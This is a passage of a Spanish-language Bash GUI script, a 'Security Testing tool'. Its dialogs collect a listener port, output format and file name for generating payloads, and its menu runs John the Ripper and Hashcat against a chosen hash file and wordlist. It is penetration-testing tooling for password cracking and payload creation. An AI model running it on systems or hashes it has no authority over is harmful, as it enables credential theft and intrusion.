					             --numeric \
					             --text-align=center \
					             --text="Introduce PUERTO escucha")

									ans=$?
									if [ $ans -eq 0 ]
									then
									    insport=$mensajeport
									else
										Payload
									fi
							}

function extension (){
						mensajex=$(yad --list \
								--title="Payload" \
				                 --height=400 \
				                 --width=100 \
				                 --button=Introducir\ Manualmente:2 \
				                 --button=Aceptar:0 \
				                 --button=Cancelar:1 \
				                 --center \
				                 --radiolist \
				                 --column="" \
				                 --column="Selecciona:" \
				                 1 "exe" 2 "macho" 3 "asp" 4 "aspx" 5 "aspx-exe" 6 "dll" 7 "jar" 8 "jsp" 9 "msi" 10 "psh" 11 "vba" 12 "vbs" 13 "sh" 14 "c" 15 "pl" 16 "ps1" 17 "py" 18 "raw" 19 "rb" 20 "elf")

				                 ans=$?
										if [ $ans -eq 0 ]
										then
											insexte=${mensajex#T*|} #quita del principio el TRUE |
											insexte2=${insexte%|} #quita del final |
											evalexte=$insexte2 #me queda solo el payload a utilizar
										elif [ $ans -eq 2 ]
										then
											manualext=$(yad --entry \
											--title="Payload" \
								             --image=gtk-info \
								             --width=250 \
								             --height=80 \
								             --width=250 \
								             --button=Aceptar:0 \
								             --button=Cancelar:1 \
								             --center \
								             --text-align=center \
								             --text="Introduce manualmente la extensión")

												ans=$?
												if [ $ans -eq 0 ]
												then
												    insmanualext=$manualext
												
												else
												    Payload
												fi


										else
											Payload
										fi

							}

function ejecutable (){
						mensajeje=$(yad --entry \
								--title="Payload" \
					             --image=imagenes/extension.ico \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --button=Cancelar:1 \
					             --center \
					             --text-align=center \
					             --text="Introduce el nombre del archivo")

									ans=$?
									if [ $ans -eq 0 ]
									then
									    inseje=$mensajeje
									else
										Payload
									fi
							}


#*****************************************************************************************************************************************************************************************

function Crackear(){

	tools_rec=$(yad --center --width=700 --height=300 --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Password Cracking" --button=Aceptar:0 --button=Atrás:1 --separator= --column="Tools" Crackstation\ Online John\ the\ Ripper Hashcat)

	case $tools_rec in
		Crackstation\ Online)
			crackstation
		;;
		John\ the\ Ripper)
			john
		;;
		Hashcat)
			hashcat
		;;
		*)
			menu
		;;
	esac
}

function crackstation(){
echo -e "
\t────────────────────────────────────────────────────────
\t█▀▀ █▀▀█ █▀▀█ █▀▀ █░█ █▀▀ ▀▀█▀▀ █▀▀█ ▀▀█▀▀ ░▀░ █▀▀█ █▀▀▄ 
\t█░░ █▄▄▀ █▄▄█ █░░ █▀▄ ▀▀█ ░░█░░ █▄▄█ ░░█░░ ▀█▀ █░░█ █░░█ 
\t▀▀▀ ▀░▀▀ ▀░░▀ ▀▀▀ ▀░▀ ▀▀▀ ░░▀░░ ▀░░▀ ░░▀░░ ▀▀▀ ▀▀▀▀ ▀░░▀
\t────────────────────────────────────────────────────────"
linea

	xdg-open "https://crackstation.net/" 2>/dev/null &

	yad --title="Crackstation" \
    --center \
    --width=250 \
    --height=80 \
    --text-align=center \
    --text="URL en proceso de apertura" \
    --button=OK:0
ans=$?
if [ $ans -eq 0 ]
then
    Crackear
else
	Crackear
fi	
}

function john(){
echo -e "
\t─────────────────────────────────────────────────────────────────────
\t░░░▒█ █▀▀█ █░░█ █▀▀▄ 　 ▀▀█▀▀ █░░█ █▀▀ 　 █▀▀█ ░▀░ █▀▀█ █▀▀█ █▀▀ █▀▀█ 
\t░▄░▒█ █░░█ █▀▀█ █░░█ 　 ░░█░░ █▀▀█ █▀▀ 　 █▄▄▀ ▀█▀ █░░█ █░░█ █▀▀ █▄▄▀ 
\t▒█▄▄█ ▀▀▀▀ ▀░░▀ ▀░░▀ 　 ░░▀░░ ▀░░▀ ▀▀▀ 　 ▀░▀▀ ▀▀▀ █▀▀▀ █▀▀▀ ▀▀▀ ▀░▀▀
\t─────────────────────────────────────────────────────────────────────"
linea

		mensaje=$(yad --list \
				--title="Jonh the ripper" \
            	--height=200 \
                --width=400 \
                --button=Aceptar:0 \
                --button=Cancelar:1 \
                --center \
                --text="Seleccione el modo a ejecutar" \
                --radiolist \
                --column="" \
                --column="Modos" \
                1 "Básico(Utilizando Wordlist interna)" 2 "Introduciendo Wordlist" 3 "Recordar contraseñas encontradas")
		
		        ans=$?
							if [ $ans -eq 0 ]
							then
							    if [[ $mensaje =~ "Básico(Utilizando Wordlist interna)" ]]
							    then
							    	seleccionarchivo
							    	echo -e "\n${yellow}[!]Ejecutándose, puede demorarse un poco${endColour}\n"
							    	if [[ $(sudo john $archivo | grep "No password hashes left to crack" | wc -l) > 0 ]] &>/dev/null
										then 
											echo -e "Esta password ya ha sido crackeada\n"
											sudo john --show $archivo | grep -v "password hash cracked" 
							    			Crackear
							    		else
							    			echo -e "Contraseña encontrada\n"
							    			sudo john --show $archivo | grep -v "password hash cracked" 
							    			Crackear
							    	fi

							    elif [[ $mensaje =~ "Introduciendo Wordlist" ]] 
							    then
									seleccionarchivo
									seleccionarWordlist
									echo -e "${yellow}[!] Ejecutándose, puede demorarse un poco${endColour}\n"
							    	if [[ $(sudo john --wordlist=$diccionario $archivo | grep "No password hashes left to crack" | wc -l) > 0 ]] &>/dev/null
										then 
											echo -e "Esta password ya ha sido crackeada\n"
											sudo john --show $archivo | grep -v "password hash cracked" 
							    			Crackear
							    		else
							    			echo -e "Contraseña encontrada\n"
							    			sudo john --show $archivo | grep -v "password hash cracked" 
							    			Crackear
							    	fi

								elif [[ $mensaje =~ "Recordar contraseñas encontradas" ]]
							    then
							    	seleccionarchivo
							    	echo -e "Password desencriptada\n"
									sudo john --show $archivo | grep -v "password hash cracked" 
									Crackear
								fi
							else
								Crackear
								
							fi       
				}


function hashcat(){

echo -e "
\t\t────────────────────────────────────────────
\t\t███████████████████████████████████████
\t\t█─█─██▀▄─██─▄▄▄▄█─█─█─▄▄▄─██▀▄─██─▄─▄─█
\t\t█─▄─██─▀─██▄▄▄▄─█─▄─█─███▀██─▀─████─███
\t\t▀▄▀▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀
\t\t──────────────────────────────────────────────"
linea

		modo=$(yad --entry \
		           --title="Hashcat" \
		           --image=imagenes/iconoHashcat.png  \
		           --width=300 \
		           --height=60 \
		           --width=300 \
		           --button=Aceptar:0 \
		           --center \
		           --numeric \
		           --text-align=center \
		           --text="Introduce el Hash modes, por ejemplo: 0 --> MD5 ")
			ans=$?
			if [ $ans -eq 0 ]
			then
			    modo=$modo
			else
			    Crackear
			fi

		seleccionarchivo
		seleccionarWordlist

		touch cracked.txt

		echo -e "${yellow}[!] Ejecutándo hashcat.............${endColour}\n"
		sleep 3

		sudo hashcat -m $modo -a 0 -o cracked.txt $archivo $diccionario --potfile-disable 1>/dev/null # con -potfile-disable  evitamos que se guarden las pass en "/root/.hashcat/hashcat.potfile"

		echo -e "Estas son las password que ha conseguido crackear: \n"
		
		if [ -s cracked.txt ]
		then
			cat cracked.txt		
		else
			echo "Ninguna"
		fi
		rm -r cracked.txt

		Crackear

}



#-------------------Funciones para John the Ripper y hashcat -------------------------------------------------------------------


function seleccionarchivo(){
	archivo=$(yad --file \
              --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
              --height=200 \
              --width=100 \
              --center \
              --text="Selecciona el archivo a crackear:" \
              --file="*") #con el * haremos que salga todos los archivos
ans=$?
if [ $ans -eq 0 ]
then
    archivo=$archivo
else
    crackear
fi
}

function seleccionarWordlist(){
	diccionario=$(yad --file \
              --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
              --height=200 \
              --width=100 \
              --center \
              --text="Selecciona el diccionario a utilizar:" \
              --file="*") #con el * haremos que salga todos los archivos
ans=$?
if [ $ans -eq 0 ]
then
    diccionario=$diccionario
else
    crackear
fi
}

#------------------------------------------------------------------------------------------------------------------------


function salir(){
	yad --image imagenes/salida.jpg --center --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --width=450 --height=400 --info --button="Ok":0
	exit
}

#inicio programa
menu     					#hace que se inicie la funcion primera para meter ip.